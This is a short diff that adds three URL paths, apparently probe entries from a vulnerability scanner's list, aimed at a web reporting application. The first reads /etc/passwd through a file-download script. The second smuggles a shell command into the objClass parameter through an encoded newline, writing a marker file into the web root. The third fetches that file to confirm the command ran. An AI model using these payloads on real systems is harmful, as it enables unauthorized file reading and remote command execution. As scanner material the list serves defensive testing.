@@ -1,0 +1,3 @@
+/view/action/download_file.php?filename=/etc/passwd&savename=query.xls
+/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27f029ff010012ms%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a
+/view/Behavior/f029ff010012ms.txt
